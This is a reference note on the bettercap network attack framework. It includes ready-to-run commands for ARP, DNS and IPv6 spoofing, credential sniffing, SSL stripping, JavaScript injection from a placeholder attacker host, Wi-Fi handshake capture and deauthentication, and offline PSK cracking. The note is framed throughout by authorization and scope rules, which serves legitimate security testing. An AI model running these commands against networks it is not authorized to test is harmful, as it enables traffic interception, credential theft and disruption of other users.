---
name: "bettercap"
categories:
  - sniffing-spoofing
version: "2.41.7-2"
homepage: "https://github.com/bettercap/bettercap"
origin: "arch"
arch-repo: "extra"
packaged-by: [arch, kali, nixpkgs]
arch-builddate: "2026-07-07"
build-system: go
license: GPL-3.0-only
meta-checked: "2026-11-09"
github-repo: "bettercap/bettercap"
github-stars: 20241
github-pushed: "2026-11-03"
github-archived: false
github-issues: 42
github-match: "exact"
gh-checked: "2026-11-07"
worth: 9.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 104
gh-activity-checked: "2026-11-09"
---

# bettercap

> The modular Go MITM framework: ARP/DNS/NDP spoofing, scriptable HTTP(S) proxies, credential sniffing, WiFi/BLE/HID attacks and recon from one interactive session.

*No corpus evidence — derived from upstream documentation.*

## What it's for

bettercap (evilsocket, GPL-3) is an all-in-one network attack tool: one binary, one interactive session driving named modules (`arp.spoof`, `dns.spoof`, `ndp.spoof`, `dhcp6.spoof`, `http.proxy`/`https.proxy`/`any.proxy`/`tcp.proxy`/`packet.proxy`, `net.sniff`, `net.recon`, `net.probe`, `syn_scan`, `wifi`, `ble`, `hid`, `can`, REST API, …) that are configured with `set <module.parameter> <value>` and started/stopped with `<module> on|off`. Sessions are scripted with caplets (command files, including the community `hstshijack` caplet for HSTS bypass — there is no built-in `hsts-passthru` parameter; SSL stripping is `*.proxy.sslstrip`) or driven headlessly with `-eval`. It also covers WiFi recon, PMKID association and handshake capture, BLE enumeration, MouseJacking, CAN-bus, and a web UI (see the [[bettercap-ui]] note under `misc/`). It is not a passive-only tool — most attacks actively spoof or inject; run it on interfaces and networks you are authorized to test.

## Typical use cases

### Script a session from the command line with -eval

`-eval` runs one or more semicolon-separated session commands at startup — the documented way to set parameters and module state without typing them interactively.

```
sudo bettercap -iface eth0 -eval "net.probe on; net.show"
```

Outcome: starts bettercap bound to eth0, executes the commands in order (fast network discovery probe, then the hosts table), and leaves you in the interactive session where every module remains reachable — `help <module>` lists its commands and parameters.

### ARP-spoof a target and harvest credentials

The classic MITM pairing: poison the target's cache, then parse everything that crosses the man-in-the-middle position.

```
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 198.51.100.10; arp.spoof on; net.sniff on"
```

Outcome: bettercap answers ARP for the target (IP forwarding handled by `arp.spoof.forwarding`, default on) and `net.sniff` prints parsed secrets as they appear — HTTP credentials/POST bodies, cookies, NTLM and Kerberos material, FTP, TeamViewer, DNS/mDNS/SNI metadata — with `net.sniff.stats` summarizing the session.

### Intercept and rewrite HTTP(S) through proxy modules

The HTTP and HTTPS proxies transparently take over ports 80/443 (iptables redirection by default) and can inject content or strip TLS.

```
sudo bettercap -eval "set http.proxy.injectjs 'http://ATTACKER_IP/hook.js'; set https.proxy.sslstrip true; http.proxy on; https.proxy on"
```

Outcome: HTML pages served through the MITM position get the `hook.js` script tag injected (`http.proxy.injectjs` accepts a URL, path or inline JS); with `sslstrip` enabled, HTTPS links are downgraded to HTTP where they can be tampered with. For per-request logic, point `http.proxy.script` at a JavaScript proxy module instead of static injection.

### Load a community caplet (HSTS bypass)

Caplets are reusable bettercap command files; the `hstshijack` caplet from the caplets repository packages the proxy/dns scripts needed to attack HSTS-protected sites.

```
sudo bettercap -eval "caplets.update" -eval "caplet hstshijack"
```

Outcome: fetches the latest caplet set into bettercap's caplets path, then runs `hstshijack`, which wires its JavaScript modules into `http.proxy`/`dns.proxy` and loads payloads (keylogger, sslstrip, redirect) — this is the standard HSTS-aware replacement for plain SSL stripping.

### Sniff to a pcap with a BPF filter

`net.sniff` parameters tune what is parsed and where it goes; capture everything matching a filter into a file for later analysis.

```
sudo bettercap -eval "set net.sniff.filter 'tcp port 80'; set net.sniff.output web.pcap; net.sniff on"
```

Outcome: the sniffer applies the BPF filter and writes matching packets to `web.pcap` while still event-printing parsed application-layer data; `set net.sniff.source other.pcap` replays a saved capture through the same parsers without an interface.

### WiFi recon and clientless PMKID capture

On a monitor-capable adapter: enumerate the airspace, then request an association yourself to obtain key material without waiting for a client.

```
sudo bettercap -iface wlan0 -eval "wifi.recon on; set wifi.handshakes.file hs.pcap; wifi.assoc 00:11:22:33:44:55"
```

Outcome: channel-hopping recon populates the AP/client tables (`wifi.show`), and `wifi.assoc` sends an association request to the given AP (argument may be a BSSID, exact ESSID, wildcard like `Corp*`, or `all`) capturing an RSN PMKID into `hs.pcap` when the AP is vulnerable — feed the file to offline cracking; `wifi.deauth <BSSID>` forces client handshakes the same file aggregates.

---

## Bug bounty workflow with bettercap

bettercap is not a scanner. Almost every offensive module here **transmits forged frames** — ARP replies, spoofed DNS answers, IPv6 router advertisements, 802.11 deauthentication — onto a shared medium. That one fact reshapes the entire methodology: the first phase is not recon, it is an **authorization gate**, because the techniques below are criminal offences (Computer Fraud and Abuse Act, Computer Misuse Act, and their equivalents) on any network you do not own or have explicit written permission to attack. A web app scanner that mis-fires annoys a WAF; bettercap mis-fired on a corporate LAN poisons every host on the segment, drops production traffic, and is indistinguishable from a real attacker to the blue team watching.

So the governing question is not "what can bettercap find" but "is bettercap in scope at all." For the overwhelming majority of public web/API bounties (scope `*.example.com`), the answer is **no** — there is no authorized segment to sit on, and MITMing the shared infrastructure of a cloud provider or a coffee shop is out of scope and illegal. bettercap earns bounties in a narrow set of program types, and recognising which one you are in is Phase 0.

| Program type | Is bettercap in scope? | What it's for |
|---|---|---|
| Public web/API bounty (`*.example.com`) | **No** | Nothing. There is no LAN you may attack. Use a proxy against your *own* browser instead. |
| Mobile app program | Sometimes | MITM your *own* test handset on your *own* network to inspect the app↔API channel and test certificate pinning |
| IoT / hardware / device program | Often | MITM a device *you purchased* on an *isolated lab segment* — firmware-update channel, cloud comms, cleartext secrets |
| Network / infrastructure scope (usually private/invite) | Yes, if the RoE says so | Layer-2 credential capture, DNS/NDP spoofing, LLMNR/NBNS harvesting — each must be individually authorized |
| Authorized wireless assessment | Yes, for the named SSID/BSSID | PMKID/handshake capture, deauth (if permitted), rogue-AP testing |

### Phase 0 — The authorization gate (before the binary runs)

Read the rules of engagement and confirm, in writing, that each specific technique you intend to use is allowed. These are *separate* authorizations — "network testing is permitted" does not imply "you may deauth clients" or "you may strip TLS." Get explicit sign-off on, at minimum:

- **The exact segment/CIDR** you may sit on, and confirmation you own or control it (lab VLAN, your own test Wi-Fi, a device you bought).
- **ARP/NDP spoofing** — poisons caches; recoverable but disruptive.
- **DNS spoofing** — redirects name resolution for every victim behind the MITM.
- **802.11 deauthentication** — a denial-of-service primitive; many programs ban it outright.
- **SSL stripping / proxy injection / `hstshijack`** — tampers with live traffic; lab or explicitly-authorized networks only.
- **A maintenance window and a rollback plan** — who to call when the segment goes sideways.

If the program is a standard web/API bounty and none of the above is addressed, bettercap has no role. Stop here and reach for a web proxy. Everything past this phase assumes the gate is green.

### Phase 1 — Passive recon (no forged packets yet)

Goal: map the segment and see what already crosses it *before* injecting anything. This phase transmits nothing offensive, so it is the safest and often the most productive.

- **`net.recon on`** watches the system ARP table and observed traffic to build the hosts table (`net.show`) — it does not actively probe. Leave **`net.probe off`** in this phase: `net.probe` *sends* mDNS/NBNS/UPnP/WSD probes (`net.probe.mdns`, `net.probe.nbns`, `net.probe.upnp`, `net.probe.wsd`, all default `true`) and is therefore detectable. Turn it on only once you have decided active discovery is acceptable.
- **`net.sniff on`** with **`net.sniff.local false`** (the default) on a switched network still shows you all broadcast/multicast chatter — mDNS, LLMNR, NBNS, DHCP, ARP, SSDP — which leaks hostnames, OS hints, service announcements, and sometimes cleartext credentials, *without any spoofing*. This is the "observe before you touch" step from the fast-rule of MITM work.
- **`wifi.recon on`** on a monitor-mode adapter is purely receive-side: it channel-hops (`wifi.hop.period`, default 250 ms) and populates the AP/client tables with no transmission until you run `wifi.assoc` or `wifi.deauth`.

Snapshot the baseline: `net.show`, `wifi.show`, and a short `net.sniff.output baseline.pcap` capture. Everything active you do later is diffed against this.

### Phase 2 — Controlled MITM positioning (minimal, targeted spoofing)

Goal: intercept exactly one authorized host, never the whole segment.

The single most important setting: **`set arp.spoof.targets <one authorized IP>`**. Its default is the *entire subnet* — leaving it at default MITMs every host on the LAN, which is both a scope violation and a reliability hazard (you become a bottleneck and single point of failure for the whole segment). Scope it down, always.

```
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets 198.51.100.10; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"
```

- **`arp.spoof.fullduplex`** (default `false`): when `true`, also poisons the gateway so you see both directions. It fails against routers with ARP-spoofing protection — if the gateway ignores you, you only get the victim→gateway half.
- **`arp.spoof.forwarding`** (default `true`): keeps kernel IP forwarding on so the victim stays connected through you. Leave it on unless you intend a denial of service — and note `arp.ban on` deliberately *disables* forwarding to black-hole the target (that is a DoS; authorize it separately or don't use it).
- **`arp.spoof.skip_restore`** (default `false`): leave it `false` so bettercap restores the victim's ARP cache when you stop. Setting it `true` leaves caches poisoned after you exit — avoid on any network you will hand back.
- **IPv6 segments:** `ndp.spoof` (parameters `ndp.spoof.targets`, `ndp.spoof.neighbour` default `fe80::1`, `ndp.spoof.prefix` default `d00d::`) is the v6 analogue. The classic rogue-DNS takeover is `dhcp6.spoof` + `dns.spoof` together — `dhcp6.spoof` must be paired with `dns.spoof` to be effective, exactly as the module docs state. Dual-stack hosts frequently prefer IPv6, so a v4-only defender misses this entirely.

### Phase 3 — Traffic analysis and credential capture

With the MITM established, `net.sniff`'s dissectors print parsed application-layer secrets as they cross you: HTTP credentials and POST bodies, cookies, NTLM/Kerberos material, FTP, DNS/mDNS queries, TLS SNI. Narrow the firehose and always write a pcap for evidence:

```
set net.sniff.filter "tcp port 80 or tcp port 21 or udp port 5353"
set net.sniff.output engagement.pcap
set net.sniff.regexp "(?i)(pass|token|authorization)"
net.sniff on
```

- **`net.sniff.filter`** (default `not arp`) is a standard BPF expression — scope it to the ports your finding is about to keep the capture small and on-point.
- **`net.sniff.regexp`** surfaces only packets whose payload matches, which is how you pull a credential out of noise without `net.sniff.verbose true` (which floods `events.stream` with *every* packet).
- **`net.sniff stats`** (a sub-command, not a parameter) prints session counters for the report.
- `set net.sniff.source engagement.pcap` replays a saved capture back through the dissectors with no live interface — useful for re-deriving evidence offline after the window closes.

### Phase 4 — TLS inspection and certificate-pinning assessment

This is where bettercap earns mobile and IoT bounties. The proxies (`http.proxy`, `https.proxy`) sit transparently on the redirected ports and let you observe — or tamper with — the client↔server channel. For a bug hunter the *diagnostic* value usually beats the offensive value:

- **No certificate pinning** → the app/device accepts bettercap's generated CA (`https.proxy.certificate`, default `~/.bettercap-ca.cert.pem`; bettercap fetches the real cert and re-signs the chain with its own CA). If you can read the plaintext API traffic of a mobile app after installing bettercap's CA — or worse, *without* installing it — that is a reportable pinning/validation failure.
- **Cleartext fallback / SSL strip** → `set https.proxy.sslstrip true` (and `http.proxy.sslstrip`) downgrade HTTPS links to HTTP. If the client follows the downgrade and sends secrets in the clear, that's the finding.
- **Content injection** → `http.proxy.injectjs` (a URL, file path, or inline JS) and `http.proxy.script` (a JavaScript proxy module with `onRequest`/`onResponse`/`onLoad`/`onExit`/`onCommand` hooks) demonstrate active tampering — authorized labs only.

```
# authorized lab segment only — demonstrates a client that does not pin
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets 198.51.100.20; arp.spoof on; \
   set https.proxy.sslstrip true; http.proxy on; https.proxy on"
```

For HSTS-protected sites, plain `sslstrip` is defeated by the browser's HSTS cache; the community **`hstshijack`** caplet (from the `bettercap/caplets` repo) wires its JS modules into `http.proxy`/`dns.proxy` to work around it. Note the honest caveat: against HSTS-**preloaded** domains and modern browsers, `hstshijack` is largely neutralised — it remains useful mainly against non-preloaded sites, first-visit scenarios, and custom clients that ignore HSTS. Don't oversell it in a report.

```
sudo bettercap -eval "caplets.update"          # fetch/refresh the caplet set
sudo bettercap -iface eth0 -caplet hstshijack  # load it at startup via the -caplet flag
```

### Phase 5 — Wireless key-material capture

On a monitor-capable adapter, the clientless and client-forced paths both land in one pcap:

```
sudo bettercap -iface wlan0 -eval \
  "set wifi.handshakes.file hs.pcap; set wifi.handshakes.aggregate true; \
   wifi.recon on; set wifi.recon.channel 1,6,11"
```

- **`wifi.assoc <BSSID>`** sends an association request to capture an **RSN PMKID** with no client present (`wifi.assoc.open`/`wifi.assoc.acquired`/`wifi.assoc.skip` tune which APs it targets).
- **`wifi.deauth <BSSID>`** forces connected clients to reauthenticate so you capture the 4-way handshake — this is a **denial-of-service to those clients**; it must be separately authorized and is banned by many programs. `wifi.deauth.open` defaults to `true` (will hit open networks) and `wifi.deauth.skip` lets you exclude BSSIDs — set these deliberately.
- **`wifi.handshakes.aggregate true`** (default) writes everything to one file; `false` writes a per-network folder.

Hand the pcap to offline cracking — this is where it meets the [[hashcat]] note:

```
hcxpcapngtool -o hash.hc22000 hs.pcap     # convert capture
hashcat -m 22000 hash.hc22000 wordlist.txt  # PMKID + EAPOL (mode 22000)
```

All cracking is offline and off-target; nothing in Phase 5 after capture touches the program's network.

### Phase 6 — Validate and package

Confirm the finding reproduces, restore every poisoned cache (stop modules cleanly so `arp.spoof`/`ndp.spoof` restore ARP/NDP state — do not kill `-9`), remove bettercap's CA from any test device, and assemble the evidence (Phase "Reporting evidence" below).

---

## Where the money is with bettercap

Because bettercap only operates inside the narrow authorized-segment slice above, its "finding classes" are deployment/transport weaknesses, not application-logic bugs. The realistic payout map:

| Finding class | Module / feature that reaches it | Typical severity | Dupe / scope risk |
|---|---|---|---|
| No TLS certificate pinning (mobile/IoT app accepts attacker CA) | `https.proxy` + `arp.spoof` on your own test device | Medium–High | Low dupe; very common in device programs |
| Cleartext secrets on the wire (API keys, tokens, creds over HTTP) | `net.sniff` dissectors + `net.sniff.output` | High | Low–Medium; strong if secrets are long-lived |
| Firmware/update channel over plain HTTP (no signature check) | `net.sniff` + `http.proxy` injection on lab segment | High–Critical | Low dupe; headline IoT bug |
| HTTPS downgrade accepted by client | `https.proxy.sslstrip`, `hstshijack` caplet | Medium–High | Medium; HSTS preloading kills many cases |
| IPv6 rogue-DNS / router takeover (mitm6-style) | `dhcp6.spoof` + `dns.spoof`, `ndp.spoof` | High | Low; defenders forget v6 |
| LLMNR/NBNS/mDNS credential harvest | passive `net.sniff` on authorized LAN | Medium–High | Medium on internal-network engagements |
| Weak Wi-Fi PSK (crackable PMKID/handshake) | `wifi.assoc` / `wifi.deauth` → [[hashcat]] | Medium–High | Low dupe on wireless assessments |
| Plaintext service auth (FTP, Telnet, HTTP Basic, SNMP) | `net.sniff` protocol parsers | Medium | Medium; depends on data sensitivity |
| Client trusts spoofed DNS (no DoH/DoT, no validation) | `dns.spoof` (needs `arp.spoof`/`dhcp6.spoof` active) | Medium–High | Low; chains into phishing/redirect PoCs |

The two highest-value, lowest-dupe classes for most hunters are **certificate-pinning failures** (device/mobile programs) and **HTTP firmware/update channels** (IoT) — both are reachable on a segment you fully own, so the authorization question is clean, and both are routinely underreported because they require sitting on the wire rather than fuzzing an endpoint.

---

## Command recipes

Annotated command → expected-output blocks. Low-volume, targeted, passive-first settings are called out in each.

**Passive host + service map (transmits nothing offensive):**

```
sudo bettercap -iface eth0 -eval "net.recon on; net.show"
# -> hosts table: IP, MAC, vendor, last-seen, sent/recv counters.
# net.probe stays OFF here — net.recon only watches; it does not probe.
```

**Targeted single-host intercept (never the whole subnet):**

```
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets 198.51.100.10; arp.spoof on; net.sniff on"
# -> ARP replies sent only for 198.51.100.10; sniffer prints parsed
#    creds/cookies/SNI for that one host. arp.spoof.forwarding (default
#    true) keeps the victim online through you.
```

**Evidence-grade capture with a tight filter:**

```
set net.sniff.filter "host 198.51.100.10 and tcp port 80"
set net.sniff.output finding-01.pcap
net.sniff on
# ... reproduce the issue ...
net.sniff stats          # prints packet/parse counters for the report
net.sniff off
# -> finding-01.pcap contains only the target's port-80 traffic.
```

**Certificate-pinning check on your own test device (lab segment):**

```
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets 198.51.100.20; arp.spoof on; http.proxy on; https.proxy on"
# -> if the app's API calls appear decrypted in events.stream, the client
#    accepted bettercap's CA -> no/broken pinning. If the app errors out
#    on the cert, pinning holds (negative result — still report the method).
```

**IPv6 rogue DNS (mitm6-style), authorized internal engagement:**

```
sudo bettercap -iface eth0 -eval \
  "set dns.spoof.domains *.example.com; set dns.spoof.address 198.51.100.99; \
   dhcp6.spoof on; dns.spoof on"
# -> dhcp6.spoof advertises this host as the DNSv6 server; dns.spoof then
#    answers example.com lookups with 198.51.100.99. dns.spoof needs a
#    spoofer (arp/dhcp6) active to receive others' queries.
```

**Clientless Wi-Fi PMKID capture (authorized SSID), minimal footprint:**

```
sudo bettercap -iface wlan0 -eval \
  "set wifi.handshakes.file hs.pcap; wifi.recon on; set wifi.recon.channel 6; \
   wifi.assoc DE:AD:BE:EF:00:01"
# -> association request to one BSSID on one channel; RSN PMKID lands in
#    hs.pcap if the AP is vulnerable. No deauth, no client disruption.
```

**Scripted headless run via caplet, then quit (CI-style evidence run):**

```
sudo bettercap -iface eth0 -no-history -eval "caplets.update; q"   # refresh caplets, exit
sudo bettercap -iface eth0 -caplet ./engagement.cap                # run your own .cap file
# -> -caplet accepts a path or bare name (searched in ./, ./caplets/,
#    $CAPSPATH, /usr/local/share/bettercap/caplets/). -no-history keeps
#    the session out of ~/.bettercap.history on shared boxes.
```

**Remote-control / automation via the REST API (bind to loopback):**

```
sudo bettercap -eval \
  "set api.rest.address 127.0.0.1; set api.rest.port 8081; \
   set api.rest.username hunter; set api.rest.password $(openssl rand -hex 16); \
   api.rest on"
# -> REST API on 127.0.0.1:8081 ONLY. Never bind api.rest.address to
#    0.0.0.0 on an engagement — defaults are user/pass and the API drives
#    every offensive module. api.rest.record/replay capture sessions.
```

---

## Pitfalls, noise and scope discipline

How hunters get reports rejected, or get banned (or prosecuted):

- **Running bettercap where there is no authorized segment.** The number-one mistake: firing arp.spoof on office/coffee-shop/cloud Wi-Fi for a web bounty. That is unauthorized access to every other host on the LAN — out of scope, and a crime. If the program scope is `*.example.com`, there is nothing here for you.
- **Leaving `arp.spoof.targets` at its subnet-wide default.** You become the MITM for *every* host, saturating yourself and creating a single point of failure for the whole segment. Always `set arp.spoof.targets <one authorized IP>`.
- **Treating `arp.ban`, `wifi.deauth`, and parser-flooding as free.** `arp.ban` disables forwarding (black-hole DoS); `wifi.deauth` is a client DoS; `net.fuzz` mutates live packets. Each is a denial-of-service primitive that most programs prohibit. Don't run them to "demonstrate impact" unless the RoE names them.
- **`arp.spoof.skip_restore true` / hard-killing the process.** Both leave victim ARP/NDP caches poisoned after you leave. Stop modules cleanly (`arp.spoof off`, then `q`) so caches restore. Hand the network back the way you found it.
- **Forgetting bettercap's CA on a test device.** If you installed `~/.bettercap-ca.cert.pem` to test pinning, remove it — you've widened that device's trust store.
- **SSL-strip / inject on anything but a device you own.** `sslstrip`, `injectjs`, and `hstshijack` tamper with live traffic for whoever is behind the MITM. On a shared network that is other people's sessions — never acceptable, and the hallmark of a report that gets a hunter removed.
- **Binding the REST API or web UI to `0.0.0.0` with default creds.** `api.rest.username`/`password` default to `user`/`pass`; the API controls every module. Keep `api.rest.address` on `127.0.0.1`.
- **Overclaiming `hstshijack`/sslstrip impact.** Against HSTS-preloaded domains it mostly fails on modern browsers. Report what actually reproduced, with the pcap, not the theoretical downgrade.
- **Noisy active recon during the quiet phase.** `net.probe` (mDNS/NBNS/UPnP/WSD) and `wifi.deauth` light up IDS/WIDS. Start with `net.recon`/passive `net.sniff`/`wifi.recon` and escalate only when needed.

Scope discipline in one line: **every module that transmits is a separate authorization; if the RoE doesn't name it, don't send it.**

---

## Reporting evidence

bettercap findings are transport/deployment claims, so the evidence must prove *what crossed the wire* and *under what MITM conditions*. Capture:

- **The exact session commands** — paste the `-eval` string or the `.cap` caplet, including the scoped `arp.spoof.targets` value, so the triager sees you targeted one authorized host, not the subnet.
- **A trimmed pcap** (`net.sniff.output`) containing *only* the packets that prove the finding, filtered with `net.sniff.filter`. Redact or minimise any third-party data; never capture more than the proof needs.
- **`net.sniff stats` output** for the session (packet counts, parse counts) as a volume/impact summary.
- **The parsed-credential / plaintext-secret event line** from `events.stream`, with sensitive values redacted to the minimum that still demonstrates exposure (e.g. show the field name and first/last chars of a token, not the whole token).
- **For pinning findings:** a before/after — the app's normal TLS behaviour, then the decrypted request/response pair proving the client accepted bettercap's CA (or sent cleartext after `sslstrip`). State clearly whether the CA was installed or not; "no CA installed and still decrypted" is a far stronger claim.
- **For Wi-Fi findings:** the `wifi.handshakes.file` pcap, the `hcxpcapngtool` conversion command, and the `hashcat -m 22000` result — PSK redacted, with crack time/wordlist noted as feasibility evidence.
- **Environment context:** interface, adapter/chipset (for Wi-Fi), bettercap version (`-version`), the authorized segment CIDR, and the authorization reference (ticket/RoE line) that permitted the technique.
- **Cleanup confirmation:** a line stating ARP/NDP caches were restored and any test-device CA removed.

Frame impact precisely: "on the authorized lab segment, device X transmitted its API token over plain HTTP, captured in `finding-01.pcap`" — not "the network is insecure." Map to the relevant transport/crypto weakness and recommend the fix (enable TLS, pin certificates, sign firmware, enforce HSTS preload, disable legacy plaintext services).

---

## References

- bettercap — ARP spoofer module (`arp.spoof`, `arp.ban`, parameters/defaults) — https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
- bettercap — DNS spoofer module (`dns.spoof`) — https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/
- bettercap — NDP spoofer module (`ndp.spoof`, IPv6) — https://www.bettercap.org/modules/ethernet/spoofers/ndpspoof/
- bettercap — DHCPv6 spoofer module (`dhcp6.spoof`) — https://www.bettercap.org/modules/ethernet/spoofers/dhcp6spoof/
- bettercap — net.sniff / net.fuzz module (BPF filter, output, regexp, local, verbose) — https://www.bettercap.org/modules/ethernet/netsniff/
- bettercap — net.recon module — https://www.bettercap.org/modules/ethernet/netrecon/
- bettercap — net.probe module — https://www.bettercap.org/modules/ethernet/netprobe/
- bettercap — http.proxy module (sslstrip, injectjs, script, redirect) — https://www.bettercap.org/modules/ethernet/proxies/httpproxy/
- bettercap — https.proxy module (certificate/key, sslstrip) — https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/
- bettercap — tcp.proxy module — https://www.bettercap.org/modules/ethernet/proxies/tcpproxy/
- bettercap — any.proxy module — https://www.bettercap.org/modules/ethernet/proxies/anyproxy/
- bettercap — WiFi module (`wifi.recon`, `wifi.assoc`, `wifi.deauth`, `wifi.handshakes.*`) — https://www.bettercap.org/modules/wifi/
- bettercap — caplets module (`caplets.show`/`paths`/`update`) — https://www.bettercap.org/modules/core/caplets/
- bettercap — REST API module (`api.rest`, auth, record/replay) — https://www.bettercap.org/modules/core/apirest/
- bettercap — interactive session, CLI flags and core commands — https://www.bettercap.org/usage/interactive_session/
- bettercap — installation — https://www.bettercap.org/project/installation/
- bettercap caplets repository (`hstshijack`) — https://github.com/bettercap/caplets
- bettercap source repository — https://github.com/bettercap/bettercap

*Research supplement added 2026-11-15, grounded in the official bettercap module/usage documentation at bettercap.org (arpspoof, dnsspoof, ndpspoof, dhcp6spoof, netsniff, netrecon, netprobe, httpproxy, httpsproxy, tcpproxy, anyproxy, wifi, caplets, apirest, interactive_session) and the bettercap/caplets repo; flags and defaults verified against those pages (model: claude-opus-4-8).*
